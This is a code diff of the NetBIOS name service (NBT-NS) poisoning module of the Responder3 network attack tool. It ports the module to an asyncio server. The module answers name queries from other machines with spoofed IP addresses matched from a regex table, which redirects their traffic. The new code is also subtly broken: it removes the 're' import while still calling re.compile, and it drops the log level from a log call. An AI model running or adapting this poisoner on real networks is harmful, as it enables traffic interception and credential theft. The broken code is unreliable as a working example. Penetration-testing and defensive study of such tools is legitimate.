@@ -1,29 +1,21 @@
-import os
-import copy
-import logging
-import traceback
 import socket
-import enum
-import traceback
+import struct
+import logging
+import asyncio
 import ipaddress
-import re
+import traceback
 
+from responder3.core.commons import *
 from responder3.protocols.NetBIOS import * 
-from responder3.servers.BASE import ResponderServer, ResponderProtocolUDP, ProtocolSession, PoisonerMode
+from responder3.core.servertemplate import ResponderServer, ResponderServerSession
 
-class NBTNSSession(ProtocolSession):
-	def __init__(self, server):
-		ProtocolSession.__init__(self, server)
+
+class NBTNSSession(ResponderServerSession):
+	pass
 
 class NBTNS(ResponderServer):
-	def __init__(self):
-		ResponderServer.__init__(self)
-
-	def modulename(self):
-		return 'NBTS'
-
-	def setup(self):
-		self.protocol = NBTNSProtocol
+	def init(self):
+		self.parser = NBTNSPacket
 		self.spoofTable = []
 		if self.settings is None:
 			self.log(logging.INFO, 'No settings defined, adjusting to Analysis functionality!')
@@ -37,57 +29,47 @@ class NBTNS(ResponderServer):
 
 			#compiling re strings to actual re objects and converting IP strings to IP objects
 			if self.settings['mode'] == PoisonerMode.SPOOF:
-				for exp in self.settings['spoofTable']:
-					if exp == 'ALL':
-						self.spoofTable.append((re.compile('.*'),ipaddress.ip_address(self.settings['spoofTable'][exp])))
-						continue
-					self.spoofTable.append((re.compile(exp),ipaddress.ip_address(self.settings['spoofTable'][exp])))
+				for exp in self.settings['spooftable']:
+					self.spoofTable.append((re.compile(exp),ipaddress.ip_address(self.settings['spooftable'][exp])))
 
+	@asyncio.coroutine
+	def parse_message(self):
+		msg = yield from asyncio.wait_for(self.parser.from_streamreader(self.creader), timeout=1)
+		return msg
 
+	@asyncio.coroutine
+	def send_data(self, data):
+		yield from asyncio.wait_for(self.cwriter.write(data), timeout=1)
+		return
 
-	def handle(self, packet, addr, transport, session):
-		if 'R3DEEPDEBUG' in os.environ:
-				self.log(logging.INFO,'Packet: %s' % (repr(packet),), session)
-			
+	@asyncio.coroutine
+	def run(self):
 		try:
+			msg = yield from asyncio.wait_for(self.parse_message(), timeout=1)
 			if self.settings['mode'] == PoisonerMode.ANALYSE:
-				for q in packet.Questions:
-					self.logPoisonResult(session, requestName = q.QNAME)
+				for q in msg.Questions:
+					self.logPoisonResult(requestName = q.QNAME)
 
 			else: #poisoning
 				answers = []
 				for targetRE, ip in self.spoofTable:
-					for q in packet.Questions:
+					for q in msg.Questions:
 						if targetRE.match(q.QNAME):
-							self.logPoisonResult(session, requestName = q.QNAME, poisonName = str(targetRE), poisonIP = ip)
+							self.logPoisonResult(requestName = q.QNAME, poisonName = str(targetRE), poisonIP = ip)
 							res = NBResource()
 							res.construct(q.QNAME, NBRType.NB, ip)
 							answers.append(res)
 				
 				response = NBTNSPacket()
-				response.construct(TID = packet.NAME_TRN_ID, 
+				response.construct(TID = msg.NAME_TRN_ID, 
 					 response = NBTSResponse.RESPONSE, 
 					 opcode = NBTNSOpcode.QUERY, 
 					 nmflags = NBTSNMFlags.AUTHORATIVEANSWER | NBTSNMFlags.RECURSIONDESIRED, 
 					 answers= answers)
 
-				transport.sendto(response.toBytes(), addr)
+				yield from asyncio.wait_for(self.send_data(response.toBytes()), timeout=1)
 
-			self.log(logging.DEBUG,'Sending response!')
 		except Exception as e:
 			traceback.print_exc()
-			self.log(logging.INFO,'Exception! %s' % (str(e),))
+			self.log('Exception! %s' % (str(e),))
 			pass
-		
-
-
-class NBTNSProtocol(ResponderProtocolUDP):
-	
-	def __init__(self, server):
-		ResponderProtocolUDP.__init__(self, server)
-		self._session = NBTNSSession(server.rdnsd)
-
-	def _parsebuff(self, addr):
-		packet = NBTNSPacket.from_bytes(self._buffer)
-		self._server.handle(packet, addr, self._transport, self._session)
-		self._buffer = b''
